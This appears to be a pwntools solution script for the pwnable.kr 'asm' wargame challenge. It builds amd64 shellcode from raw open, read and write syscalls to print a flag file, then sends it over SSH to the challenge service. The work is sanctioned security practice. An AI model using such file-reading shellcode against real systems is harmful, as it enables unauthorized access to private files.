from pwn import *
flag_file = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
context.arch = 'amd64'
shellcode = asm(f'''
mov rax, 2
lea rdi, [rip+filename]
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax

sub rsp, 100
mov rax, 0
mov rsi, rsp
mov rdx, 100
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 100
syscall

filename: .asciz "{flag_file}"
''')
print(shellcode)
s = ssh(host='pwnable.kr',port=2222,user='asm',password='guest')
r = s.remote('localhost', 9026)
r.sendline(shellcode)
r.interactive()

